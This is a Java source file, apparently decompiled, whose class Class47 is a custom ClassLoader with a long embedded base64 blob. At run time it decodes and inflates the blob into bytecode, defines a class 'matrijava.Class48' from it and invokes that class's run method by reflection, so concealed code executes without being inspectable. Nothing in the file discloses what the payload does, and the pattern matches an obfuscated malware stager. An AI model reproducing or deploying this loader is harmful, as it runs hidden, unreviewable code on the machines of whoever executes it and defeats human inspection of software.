import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.InflaterInputStream;
import javax.xml.bind.DatatypeConverter;
import matrijava.Class47;

public class Class47 extends ClassLoader {
  public Class47(ClassLoader paramClassLoader) {
    super(paramClassLoader);
  }
  
  public Class<?> loadClass(String paramString, byte[] paramArrayOfbyte) throws ClassNotFoundException {
    return defineClass(paramString, paramArrayOfbyte, 0, paramArrayOfbyte.length);
  }
  
  public static void run() throws Exception {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("eNqNeHmz68h1X9/Z7tXTlSWNRrtka7P13sPMgNgBjTw2NwAkQQAEsZCQs2AlQKzERhBZ7GzO6qzO6sRZ/knlP7nKNaN4En+AfJl8AVeS5rvPs2ieqnJ5q3+N093nnD6n+3T3+V//50/+FABAgv/8CNBg/Qi8BeRboDwCLwP1DmyuqN2B7R3Q");
    stringBuilder.append("74BxB8w7YN2B3R3Y3wH7DvzkDvzWHfgLd+Av3oG/dAf+8h1w7oB7B7w74N+B4A6Ed+BwB6I7EN+B45VZcpWQPgIZyB+BApS34HQLqkfgB6B+BL4PmlvQPgI/BOq1W3etnR+BHlyun8Mt+CtXJf/q9eOZpn/tDoxvwV9/BHDw27fgdx6BvwH+");
    stringBuilder.append("5i34WzfgtR/Hedy8ewO+8Vg6Op2Dpk5+QKepU9dS4fhB9c4T8wa8Mi384AZ8XorzQG4zN6h0x00h5TMp7PSs9w344cc5bJsqzg/v/GTy5OfZvnMDHs17LyibuMjrW/C3IZdtfMidpq0gx6f/f1x+/PRdyOjlqs1h+fiJeQv+DlSzjEvI4u3n");
    stringBuilder.append("LOICXeRl20AugZO98yFRaZuPqNfpfW7bOF6ydspns7oFv3sDXm3zIS6hfR5D4T+ZvHh2n6ZcuT3aFm3lBXx8NdD9M21J9u1r13vAAPYe/F3w927AV39+7KSNU2jvax8o7o8D+SSbSLYlORtTSy3DVph1oZYCgttSnanqbL6fjveLhBbnxmGj");
    stringBuilder.append("jQ+H2UQ0h0SSD5NxvVHmwtiyOXSYdpnbEYLp0NvV/MiNVy2y5Ylx2gbnwDHc7Wlayaeu8XOxa31qLxEzJldRNCcIUh5PdHZ03nkHjuTRyWy/RsYtKeSHgebRcz2npop3VsdhL660QVjis3vw98E/gLqHY+boUbF3Rjee3cI+ZMgr20Hd6FlZ");
    stringBuilder.append("jUiPPnf7s7qfqoUV5qzY5bXY7byJy6r1jp267FnLCh4dt+zUwxhd1yV2PGZRrcj3POfVa0o1B4osqRly7nE4F7ebqWcJH6tw3FzeHTMbZw52hO7IFeGOErIx5X437rsOsU7O9sSfsnXOKaNCdjtteqaHyZRauFDtTFwhGNsnhVUgyXGoFrRR");
    stringBuilder.append("MVrFUqIgBLZDHnYEOkJo3+WkoGLnvImUWSqlUbKkJhF/zKoILyybPPRVh6qUExLhaD/XcZ8azx2X47QhnghuYrfR9IAEyTGKKug4MROseY+FKFuR+lEVk1Ql9RE6YLov0LlmmlqeyDqcDuntAt1ZM4HGGgijk0yLUwsdqo2zBjtMVJ+SMf0Q");
    stringBuilder.append("0123MmiRwgwJ4WeIctgadXRi1YLgCHvARiGltvlGDmNz5QWXpKtN2m+r7VZcBwyObDakYK8DP/XLfoPy2tnSZoGtxc10th61KWIFXEPlcruanknF8aops14dMKTBGTkZZfOsIAtku3aKdSBZOOMwS0t2j36x9E49JU316SJXWItPeKi2XiB7");
    stringBuilder.append("opisZkOaUT0+s2PtshZEkTCw3pHjoDQw1t0fQtfyC+kSd6t9z4TyJtbE5TES+9DH2l0yVybhxNsXXNKUaHmplSNelKniY5l2dBvhksV8WRD8xaislO1p2zJT8jI5a0kPF9d6sDaG0zIKf3S3+IScN+5JW64ia7Z1Q5maEs6it2e5sLbTi+sX");
    stringBuilder.append("3DSCaqddOs40io96Zjk0K88RxK17iQZcc031KLjT2A2Nfrschkrv94tRSgzESdap3MmatlAuZ4slDylG594+IXT97AlwzS5Uz6yjZDjsVkXJyOLG7tbOco+1yrKVUSXASZ1hppmjmzBUeBTrV/LSRDXH2zvSJjsy3aStLz3D+bq5H1A/ovmZ");
    stringBuilder.append("hcW5jAWr0NJgbP5jtnP6zB/3e/ckRP5hFhDCvozrWmgMfdYgO6UveJ1x8cGMjiXS7lm1G4I4sUljm18M1SiWpb3CNpJT7nF6Qg7lNhg0R24QWor46RZj7Zlrrtk6wec0K2HcQQ1xVHdVllaohTqbqdNcLgS1OtvLsKGdvsFDZsHkl1g+mKFP");
    stringBuilder.append("u32IrSmytp2dLMa1sFtwCAHVtg/7SGB5XOb6tsawEO5rM1c3xqAKdDPvi2hUYpsEtSiRCJz9ScSKs+94W+94kWdcqx+tXDIRu3Qr2YoiUU3tqVEcqqk7TFay56zKbtkVgaBK80OnpCShT2mSGePLjRauTiVCc7aC1XKMc2opLS5Cyuyqpp9O");
    stringBuilder.append("sXrFTGJMr2qalMwszL3RIsl1nSiVYJVBtUexuvW67T6vAqu1xM7MF0YsR/WC107rZSST6KZw++WRmRy1JHUvlWXPeQd1pkSnVhyRrpsR45n6fGzxeOdIK0QfLjOOR4rJZFjYWZqQ0SIghXVPXwzb2NmWxginYaf607C4bul1uKpaQRJ6goTT");
    stringBuilder.append("b7ZcnvUnfKVJwkVezfZOEPedhgxbc9BKTG8UbUj6awBsPEI3aaNbZ2cjqSaU12erWWBuk3hv2/1+lPK6dh61uxO16y+qP5f2SMkoJoH7xJliTM/b+assaHZml69Wq9SWmrW6XFqUHa00ZIoHuKo5Tu/OpLqWkSzenRwlqxO+tkNdn2rUMhCZ");
    stringBuilder.append("ZrKS1n1LuU50ERzTyTJ+RSCHYUIUhOnJ5OWA51ozaDOMKpbb03DdkoLVLXt3CI0dVdnHbqnoFm3gVbQ/2aujoxfYVMHLg03ydr2ilJKsLF63unoOD5nLOI0Unl1Lu4DpD9mJwBo+m3k5tz2e5yeD2aVr0Us0xWpLQdxvKrcdks1oWDsLTrJO");
    stringBuilder.append("J4Jz5PZCrJV52WQ4njJVuhLVBG082lGJqSva5dmbj9B5f1rkNFWTcmukcEtxUO3SFgunUMqk2p7EUWy7ouiuNKy2z7K3RB0ltRjMkxvoX0kUWJTZ1VsVRl3GO9DTzYUa3FTpLPKEqvTksB8SWl/KCKGGlXMRPEUVLjMY37IspT1aLrds5Tkx");
    stringBuilder.append("RSd7Ap6osWOeVlyybalB8dNLwVl+43pu6sc+hlmj5OwX1SAtcG/YZFQe2a4RY4SojqPr2l6is6J1DPziT9RFp6/kwPV3eVY0TD45jNM8MJpD6LlnLVKCxBuOU0nBL9hkVDJVdGpXCl+FUVsHcrbSZIRsJ+1FFwqUGh16z0EakolpVzZFo8q1");
    stringBuilder.append("YY6tNorBFFVCk9wyzRiHRBmrHvZxP6+GXF8KF27ZSPQGFzDE413RrzlP1kMd39J2wSsuFe2W05OvQrW942Zfiz16HuFJmq/2SLRFcEtdjhaIEp/0vufyYrE+bc3ePPlYPcLZzLHPNbxwNfbIn+rb65KytuPZPhbWZd00lLbkN21KLuiaXJA7");
    stringBuilder.append("9BRzktqK0vhgIVEUWpcll6tjY8Gs6jwvZN8aZGVoJYnFzNXmPGPdqDzOsYGQx7ZHGMl2V9b7vB7MIjLqo4GRQqZdF0kVHuNu3ezhmZr4nWNGJM4WhjfQGafyEY2ah6EWl+lF1q2Ze9pvp6kfainpSjwvkb7saKWgCwYVK5Wv2d242SxnaO/g");
    stringBuilder.append("pr4ucGFhDUF4CppywUq9yjcnJB3Hg73aIce2THfK5OIniqNPVvqA+NRS0hcHbUfzUbNYzrtNEdFEQ2TemlmYdq7vRofK2htpA9WuuSZt+Qbevg8rdzAEqhUXzJ5k+Cr3JXI02dh6szHlIShxPg+q9XLWK3jTNSMv1WGcL9oz5XtxgrhwgSEn");
    stringBuilder.append("R/WwJb/d0rlJ4cbigPrasYAh19m7JHcaKJ5fn86EaCEaR6vyejaudTzKRyNqbRj+yTMPe3ltm6Vdjo6tNd6njV+tErWxJ3YqWv42XSkyPOKh2pukGwWy2GJMmB7bU4uPtlFqLEp6rkQK54j+GrWY9UR001Au9+ySquZlQB2bfaS7Z6nY13YT");
    stringBuilder.append("zRL/SJ4HkYVX39EpdHtCiAVsFK+dzDTiM5ZROO1m+a7cL7PjlMTOyCXtrZ1UHcdOxmG0m7uL3KuZ3FCMmVhlUQVv01nYb3FJNA80LrWbUbFMeAVP4LKp7Otxw6Z9vVwtc3tqtrit8C3vzRYLa4TMrDxytUF39PS4wojaYIkhWU8ZeyqTSTIy");
    stringBuilder.append("4QXzZJqbneZo7rJgrIRXWb0cWm2B96d1O6ORtIt8h6yx0TSIZXmdtRfR7Qw70LF2ddkOW/JC+6Sueolz3oxcfGRioubHVaRWxYldVth2iMbBJm0QZbM+JTV5jpDgrHE+VPscobOc0w+o0zgSy3niyOeX23Ilmag8KNuerDYCQ/R2vnOqQdhu");
    stringBuilder.append("tdUosAbSjFyWnO0450AEaBlGpLqrlyq5Y1J0krOKn7OTYMcuw7NJhed1OChkzxxno267RaMKgfFisZjM03BEXNoG3pE7su1PLDI/sBi8o+UlMSEwdKqyYxRrZ+aS2EvwSdEJxIIa1MMZqj0jL922I51O7ReULpYG7Z2QIZ81PBzlTo+tqs53");
    stringBuilder.append("yXiTN5qurmQh0TIYEobZEr/QCwITm/0Iz7MwapyDUHED0rQSJ6EEFxyDSXYYzS/yIBvk+lBImErHzIaN+X7NbcRcxhEv7al2LEbCCG2NhJIGfBeZZCDNYJuTTNt52sWUz4iy7p1hQJSx1WU18OQeqs0LzjbfSahx2mQnPzUNRuZ9Hxvr/qzF");
    stringBuilder.append("KNo4Rmq4Yhx7cOrRGvVDhWEJl0OpY7LfcFZaXNjjOp/MeNTL9KG1XQpdkCa+dNT8xLNCLWhqKPg0Ho2I7WzRaRvieFIzJkUmDJdRJ7EYKp9nZ8wpQNAJHbD2aTmipUGPaSWZBeOKS9RNy0W5ERZpJjvxkQ2WK6g2chy8SGEjeLOpjYmMVDtW");
    stringBuilder.append("H/wZvQuGYIT6CLqZBkgTdFx52Y9Nej6Jyq6YJbyua8w0rc6SVKyc2YZZh+fduZQD7mCwXZis3SKC08PY8RqpmYakW9IdHOKIC/G1mlatdBEoGo0CLjyfjxYbjEfwjao0sA81kfygDevxrht5u7w2xDPbFSGfKgt/R45N8mptk5p1RBj54UHr");
    stringBuilder.append("xvN9t8jjcFPT7Mxmxy03FmliwYrY/nxADxQ6Dmj4blAoXeWFFBUseFDtD21Ger1eivWkXhE7ppigBIm0edeN3QuChHFI7jKjEb3wPOng6xFFUa+tsGXvtTsrRTLF6Jq6CHbBZr/pkSje7lhZ68hlMiAKATdGi1V9OvW5aLZBhxmJHg834KdT");
    stringBuilder.append("IhpY+ERp3JwR3IET3PMx3Ihd0WpISOo+0vfIYX1BOSTeVy3GxULPRQuJN3YzrGKEo4XWEdKXPTHS9v1Ai3B5i7ORHZ7HLAH3pqoWapgcWXYS7o45R5Es6zT5MHAiMWPG/qVcGNtlnzrqqBscLCSF7VHhkwabT61RRHX2kcuq8U6wYoRgk9Nx");
    stringBuilder.append("BF/tX8wc+Ca6JlPefki1cPfgH4J/dA/GYHkLfu8e/GPwT27BP70H/wz88xvw3WdZl7aJU3SIS3SRh6nTBNXH0kQ34Ft/nieaXBq4MOF96mPN1/TMv7gWv38Dvv2pjh/PLN2DGZjfg38J/tUt+Nf34N+Af3sPRLD4uMbo8+TQPfh34A/uwTvg");
    stringBuilder.append("xzfg8z+X6LoH/x78hxvwhY/IinsMvOYW/OE9+I/gP92AL78wb3cDvvNzdLlo+KLN/Q+TbzfgSx91+Rj1pWu+67N+EMZ58Dy39+SFWbnF4kXZvdecsgxyGODfesGgJ9IvyHvBgXdN8UC6AW88/nTHd/5c30/m9W7AKxCguFevqTpo3zdelOeD");
    stringBuilder.append("zecqboIbcPv4meLm8wEQv/bifOG16bNN8aFzoaDHz1KBzwzbo32Wom6c++gMnl/NpQymRd4FVXO1/RdLp6qDiVMHNDmJc6eCo7/yInNc+b1xCJrtpW6C7BP++/rjJ78gJXsDPgOHrIMmKuC8f/NFvvmUXz7OqwrCFC4h9IEDZPe1X9QGvRnn");
    stringBuilder.append("XZFAu3EfF/OwBj8h5jnpyadJ4LvgLUCD699r4OaaA4UlB7++B16CP0h9irwPbv4I1m7Aj2D56Bn1c+BV8EuQArcFePl5/1dhDbY/Rd58+c0/fQ+89NMPx1w5A/AF8OuwfAXW3wW/AWsvgd8En4GhYAJrkMPNjyBe+/3JB+Dl/fvgldXT1199");
    stringBuilder.append("D7xmPX399gHuHuAzD/DoAT77APcP8LkH+KUH+PwDfOEBvvgArz/Alx7gjQf48gN85QG++gBfe4CvP8A3HuCbD/CtB/j2FV7/5afvgV/5GfjOR1bKwTdh+SVwB94AnwdfBl+Bv2+Dr4IfgK8BBHwd4OAbcM7fhBb4FhBgiwx+GRjgV8Bvge8A");
    stringBuilder.append("D/rkCO15At8HPRzx2+BXwe+CXwO/B34Ifh88Bn8AnoD/Ap6C/wY5/RR677+Dtz+07BRaFIa2B4uCDaS9AvGbX3wF/I+79dM33wPf3b/7h+Bz0EVQ8+/91//7v//omSOuKr/+rOsIOguHriKgghTgIeUevPRn4LVbIPwZ+NLNJwTBiPlcEP/c");
    stringBuilder.append("+d/7AHx//wH4wf7p++BX3we/Jn0Afghd+XiNvPkz8ASKf/rRoniQx0BZLDQKB43wo09wh2fEc+47yPvVq27IzwD8f3P9AXhr/zPw9vsAld+6Tmr0o1e+/srr2Mv/E+DvAeIGIvkeoKyP3PGVZ+N/HbrjXeiU33hmeBRK+EjeDVg9s4T0/wDS");
    stringBuilder.append("leMf");
    run("matrijava.Class48", stringBuilder.toString());
  }
  
  public static void pipe(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
    byte[] arrayOfByte = new byte[1024];
    int i;
    while ((i = paramInputStream.read(arrayOfByte)) > 0)
      paramOutputStream.write(arrayOfByte, 0, i); 
  }
  
  public static byte[] unzip(byte[] paramArrayOfbyte) throws Exception {
    InflaterInputStream inflaterInputStream = new InflaterInputStream(new ByteArrayInputStream(paramArrayOfbyte));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    pipe(inflaterInputStream, byteArrayOutputStream);
    return byteArrayOutputStream.toByteArray();
  }
  
  public static void run(String paramString1, String paramString2) throws Exception {
    byte[] arrayOfByte = unzip(DatatypeConverter.parseBase64Binary(paramString2));
    Class47 class47 = new Class47(ClassLoader.getSystemClassLoader());
    Class<?> clazz = class47.loadClass(paramString1, arrayOfByte);
    clazz.getMethod("run", new Class[0]).invoke(null, new Object[0]);
  }
}
